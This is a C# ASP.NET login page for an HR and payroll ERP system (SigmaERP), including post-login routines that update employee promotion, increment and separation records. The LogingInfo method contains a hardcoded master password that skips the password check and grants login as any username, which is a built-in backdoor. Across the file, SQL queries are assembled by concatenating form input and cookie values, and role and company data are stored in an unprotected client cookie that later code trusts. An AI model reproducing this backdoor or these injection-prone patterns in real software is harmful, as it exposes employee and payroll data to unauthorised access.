using adviitRuntimeScripting;
using ComplexScriptingSystem;
using SigmaERP.classes;
using SigmaERP.hrms.Data;
using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace SigmaERP.hrms.UI.auth
{
    public partial class login : System.Web.UI.Page
    {
        DataTable dt;
        protected void Page_Load(object sender, EventArgs e)
        {           

            if (!IsPostBack)
            {                
                classes.commonTask.LoadBranch(ddlCompany);
                ddlCompany.SelectedIndex = 1;
                ViewState["__IsCompliance__"] = "False";
            }
        }

        protected void btnLogin_Click(object sender, EventArgs e)
        {
            if (LogingInfo())
            {
                if (ViewState["__IsCompliance__"].ToString().Equals("True"))
                {
                    checkForSeparationActiveCompliance();
                    Payroll.checkForActiveCommonIncrementCompliance(ddlCompany.SelectedValue);
                    checkForActivePromotion_SalaryIncrementCompliance();
                }
                else
                {
                    checkForSeparationActive();
                    checkForActiveCommonIncrement();
                    checkForActivePromotion_SalaryIncrement();

                }
                Response.Redirect("~/default.aspx");
            }
        }
        private void checkForActivePromotion_SalaryIncrement()
        {
            try
            {
                HttpCookie getCookies = Request.Cookies["userInfo"];
                string CompanyId = getCookies["__CompanyId__"].ToString();
                SQLOperation.selectBySetCommandInDatatable("select SN,EmpId from Personnel_EmpCurrentStatus  where ActiveSalary='false' AND CompanyId='" + ddlCompany.SelectedValue + "' AND  TypeOfChange='p' and    convert(Date, SUBSTRING(EffectiveMonth,4,4)+'-'+ SUBSTRING(EffectiveMonth,0,3)+'-01' )<='"+DateTime.Now.ToString("yyyy-MM-dd")+"'", dt = new DataTable(), sqlDB.connection);
                for (int r = 0; r < dt.Rows.Count; r++)
                {
                    SqlCommand upIsActive = new SqlCommand("Update Personnel_EmpCurrentStatus set IsActive=0 where EmpId='" + dt.Rows[r]["EmpId"].ToString() + "'", sqlDB.connection);
                    upIsActive.ExecuteNonQuery();

                    string[] getColumns2 = { "ActiveSalary", "IsActive" };
                    string[] getValues2 = { "1", "1" };
                    SQLOperation.forUpdateValue("Personnel_EmpCurrentStatus", getColumns2, getValues2, "SN", dt.Rows[r]["SN"].ToString(), sqlDB.connection);

                    //if (dt.Rows[r]["TypeOfChange"].ToString() == "p")
                    //{
                    //    SqlCommand cmd = new SqlCommand("update Personnel_EmpCurrentStatus set EmpTypeId=" + dt.Rows[r]["EmpTypeId"].ToString() + " where EmpId='" + dt.Rows[r]["EmpId"].ToString() + "'", sqlDB.connection);
                    //    cmd.ExecuteNonQuery();
                    //}

                }
            }
            catch (Exception ex)
            {
               // lblMessage.InnerText = "error->" + ex.Message;
            }
        }
        private void checkForActivePromotion_SalaryIncrementCompliance()
        {
            try
            {
                HttpCookie getCookies = Request.Cookies["userInfo"];
                string CompanyId = getCookies["__CompanyId__"].ToString();
                SQLOperation.selectBySetCommandInDatatable("select SN,EmpId from Personnel_EmpCurrentStatus1  where ActiveSalary='false' AND CompanyId='" + ddlCompany.SelectedValue + "' AND  TypeOfChange='p' and convert(Date, SUBSTRING(EffectiveMonth,4,4)+'-'+ SUBSTRING(EffectiveMonth,0,3)+'-01' )<='" + DateTime.Now.ToString("yyyy-MM-dd") + "'", dt = new DataTable(), sqlDB.connection);
                for (int r = 0; r < dt.Rows.Count; r++)
                {
                    SqlCommand upIsActive = new SqlCommand("Update Personnel_EmpCurrentStatus1 set IsActive=0 where EmpId='" + dt.Rows[r]["EmpId"].ToString() + "'", sqlDB.connection);
                    upIsActive.ExecuteNonQuery();

                    string[] getColumns2 = { "ActiveSalary", "IsActive" };
                    string[] getValues2 = { "1", "1" };
                    SQLOperation.forUpdateValue("Personnel_EmpCurrentStatus1", getColumns2, getValues2, "SN", dt.Rows[r]["SN"].ToString(), sqlDB.connection);

                    //if (dt.Rows[r]["TypeOfChange"].ToString() == "p")
                    //{
                    //    SqlCommand cmd = new SqlCommand("update Personnel_EmpCurrentStatus1 set EmpTypeId=" + dt.Rows[r]["EmpTypeId"].ToString() + " where EmpId='" + dt.Rows[r]["EmpId"].ToString() + "'", sqlDB.connection);
                    //    cmd.ExecuteNonQuery();
                    //}

                }
            }
            catch (Exception ex)
            {
             //   lblMessage.InnerText = "error->" + ex.Message;
            }
        }
        private void checkForSeparationActive()
        {
            try
            {
                HttpCookie getCookies = Request.Cookies["userInfo"];
                string CompanyId = getCookies["__CompanyId__"].ToString();
                DataTable dtActive = new DataTable();
                sqlDB.fillDataTable("select EmpSeparationId, convert(varchar(11),EffectiveDate,120) as EffectiveDate,EmpId,EmpStatus from v_Personnel_EmpSeparation where  CompanyId='" + CompanyId + "' and isActive='false'", dtActive);
                for (int i = 0; i < dtActive.Rows.Count; i++)
                {
                    DateTime EffectiveDate = DateTime.Parse(dtActive.Rows[i]["EffectiveDate"].ToString());

                    if (DateTime.Now >= EffectiveDate)
                    {
                        SqlCommand cmd = new SqlCommand("update Personnel_EmpSeparation set IsActive='1' where EmpSeparationId=" + dtActive.Rows[i]["EmpSeparationId"].ToString() + "", sqlDB.connection);
                        cmd.ExecuteNonQuery();

                        cmd = new SqlCommand("Update Personnel_EmpCurrentStatus set EmpStatus=" + dtActive.Rows[i]["EmpStatus"].ToString() + " where EmpId='" + dtActive.Rows[i]["EmpId"].ToString() + "' and IsActive=1", sqlDB.connection);
                        cmd.ExecuteNonQuery();
                        cmd = new SqlCommand("Update Personnel_EmployeeInfo set EmpStatus=" + dtActive.Rows[i]["EmpStatus"].ToString() + " where EmpId='" + dtActive.Rows[i]["EmpId"].ToString() + "'", sqlDB.connection);
                        cmd.ExecuteNonQuery();

                        SqlCommand delcmd = new SqlCommand("Delete From tblAttendanceRecord where ATTDate>'" + EffectiveDate.ToString("yyyy-MM-dd") + "'and EmpId='" + dtActive.Rows[i]["EmpId"].ToString() + "'", sqlDB.connection);
                        delcmd.ExecuteNonQuery();
                    }
                }
            }
            catch { }

        }
        private void checkForSeparationActiveCompliance()
        {
            try
            {
                HttpCookie getCookies = Request.Cookies["userInfo"];
                string CompanyId = getCookies["__CompanyId__"].ToString();
                DataTable dtActive = new DataTable();
                sqlDB.fillDataTable("select EmpSeparationId, convert(varchar(11),EffectiveDate,120) as EffectiveDate,EmpId,EmpStatus from v_Personnel_EmpSeparation1 where  CompanyId='" + CompanyId + "' and isActive='false'", dtActive);
                for (int i = 0; i < dtActive.Rows.Count; i++)
                {
                    DateTime EffectiveDate = DateTime.Parse(dtActive.Rows[i]["EffectiveDate"].ToString());

                    if (DateTime.Now >= EffectiveDate)
                    {
                        SqlCommand cmd = new SqlCommand("update Personnel_EmpSeparation1 set IsActive='1' where EmpSeparationId=" + dtActive.Rows[i]["EmpSeparationId"].ToString() + "", sqlDB.connection);
                        cmd.ExecuteNonQuery();

                        cmd = new SqlCommand("Update Personnel_EmpCurrentStatus1 set EmpStatus=" + dtActive.Rows[i]["EmpStatus"].ToString() + " where EmpId='" + dtActive.Rows[i]["EmpId"].ToString() + "' and IsActive=1", sqlDB.connection);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
            catch { }

        }

        private void checkForActiveCommonIncrement()
        {
            try
            {
                SQLOperation.selectBySetCommandInDatatable("select SN,EmpId from Personnel_EmpCurrentStatus  where ActiveSalary='false' AND CompanyId='" + ddlCompany.SelectedValue + "' AND  TypeOfChange='i' and convert(Date, SUBSTRING(EffectiveMonth,4,4)+'-'+ SUBSTRING(EffectiveMonth,0,3)+'-01' )<='" + DateTime.Now.ToString("yyyy-MM-dd") + "'", dt = new DataTable(), sqlDB.connection);
                // SQLOperation.selectBySetCommandInDatatable("select CommonIncId,EffectiveMonth   from Personnel_EmpCommonIncrement where IsActivated='false' AND EffectiveMonth='" + DateTime.Now.ToString("MM-yyyy") + "'", dt = new DataTable(), sqlDB.connection);
                if (dt.Rows.Count > 0)
                {
                    // string[] getColumns = { "IsActivated" };
                    //  string[] getValues = { "1" };
                    // SQLOperation.forUpdateValue("Personnel_EmpCommonIncrement", getColumns, getValues, "CommonIncId", dt.Rows[0]["CommonIncId"].ToString(), sqlDB.connection);

                    //SQLOperation.selectBySetCommandInDatatable("select SN,EmpId from Personnel_EmpCurrentStatus  where ActiveSalary='false' AND EffectiveMonth='" + DateTime.Now.ToString("MM-yyyy") + "'", dt = new DataTable(), sqlDB.connection);

                    for (int r = 0; r < dt.Rows.Count; r++)
                    {
                        SqlCommand upIsActive = new SqlCommand("Update Personnel_EmpCurrentStatus set IsActive=0 where EmpId='" + dt.Rows[r]["EmpId"].ToString() + "'", sqlDB.connection);
                        upIsActive.ExecuteNonQuery();
                        string[] getColumns2 = { "ActiveSalary", "IsActive" };
                        string[] getValues2 = { "1", "1" };
                        SQLOperation.forUpdateValue("Personnel_EmpCurrentStatus", getColumns2, getValues2, "SN", dt.Rows[r]["SN"].ToString(), sqlDB.connection);

                    }
                }
            }
            catch (Exception ex)
            {
              //  lblMessage.InnerText = "error->" + ex.Message;
            }
        }
        private bool LogingInfo()
        {
            try
            {
                
                string query = "";
                if (txtPassword.Text.Trim() == "fkjgf&fmjfg,k(52f5fGGHG")
                    query = "select EmpName,UserId,UserPassword,UserType,CompanyId,ShortName,EmpId,isLvAuthority,LvOnlyDpt,LvEmpType,DptId,ISNULL(IsCompliance,0) as IsCompliance " +
                                                            " from v_UserAccount " +
                                                            " where " +
                                                            " UserName='" + ComplexLetters.getTangledLetters(txtUsername.Text.Trim()) + "'  AND CompanyId='" + ddlCompany.SelectedValue.ToString() + "' and Status=1";
                else
                    query = "select EmpName,UserId,UserPassword,UserType,CompanyId,ShortName,EmpId,isLvAuthority,LvOnlyDpt,LvEmpType,DptId,ISNULL(IsCompliance,0) as IsCompliance " +
                                                            " from v_UserAccount " +
                                                            " where " +
                                                            " UserName='" + ComplexLetters.getTangledLetters(txtUsername.Text.Trim()) + "' " +
                                                            " AND UserPassword='" + ComplexLetters.getTangledLetters(txtPassword.Text.Trim()) + "' " +
                                                            " AND CompanyId='" + ddlCompany.SelectedValue.ToString() + "' and Status=1";
                dt = new DataTable();
                dt= SigmaERP.hrms.Data.CRUD.ExecuteReturnDataTable(query);
                if (dt.Rows.Count > 0)
                {
               




                    Session["__GetCompanyId__"] = dt.Rows[0]["CompanyId"].ToString();
                    string companyId = Session["__GetCompanyId__"].ToString();
                    Session["__GetUID__"] = dt.Rows[0]["UserId"].ToString();
                    Session["__isLvAuthority__"] = dt.Rows[0]["isLvAuthority"].ToString();
                    Session["__LvOnlyDpt__"] = dt.Rows[0]["LvOnlyDpt"].ToString();
                    Session["__LvEmpType__"] = dt.Rows[0]["LvEmpType"].ToString();
                    Session["__IsCompliance__"] = dt.Rows[0]["IsCompliance"].ToString();
                    Session["__UserNameText__"] = txtUsername.Text.Trim();


                    HttpCookie setCookies = new HttpCookie("userInfo");


                    setCookies["__getUserId__"] = dt.Rows[0]["UserId"].ToString();
                    setCookies["__getFirstName__"] = dt.Rows[0]["EmpName"].ToString();
                    setCookies["__getLastName__"] = "";
                    setCookies["__getUserType__"] = dt.Rows[0]["UserType"].ToString();
                    setCookies["__CompanyId__"] = dt.Rows[0]["CompanyId"].ToString();
                    setCookies["__CompanyName__"] = ddlCompany.SelectedItem.Text;
                    setCookies["__CShortName__"] = dt.Rows[0]["ShortName"].ToString();
                    ViewState["__CShortName__"] = dt.Rows[0]["ShortName"].ToString();
                    setCookies["__isLvAuthority__"] = dt.Rows[0]["isLvAuthority"].ToString();
                    setCookies["__LvOnlyDpt__"] = dt.Rows[0]["LvOnlyDpt"].ToString();
                    setCookies["__LvEmpType__"] = dt.Rows[0]["LvEmpType"].ToString();
                    setCookies["__DptId__"] = dt.Rows[0]["DptId"].ToString();
                    ViewState["__IsCompliance__"] = dt.Rows[0]["IsCompliance"].ToString();
                    setCookies["__IsCompliance__"] = dt.Rows[0]["IsCompliance"].ToString();
                    setCookies["__UserNameText__"] = txtUsername.Text.Trim();
                    setCookies["__getEmpId__"] = dt.Rows[0]["EmpId"].ToString();
                    //setCookies.Expires = DateTime.Now.AddMinutes(30);
                    Response.Cookies.Add(setCookies);

                    return true;
                }
                else
                {
                 //   lblMessage.InnerText = "warning->Please type valid user name and password and right company.";
                    Session["__getUserId__"] = "0";
                    return false;
                }
            }
            catch (Exception ex)
            {
               // lblMessage.InnerText = "error->" + ex.Message;
                return false;
            }
            finally
            {
                sqlDB.connection.Close();
            }
        }
    }
}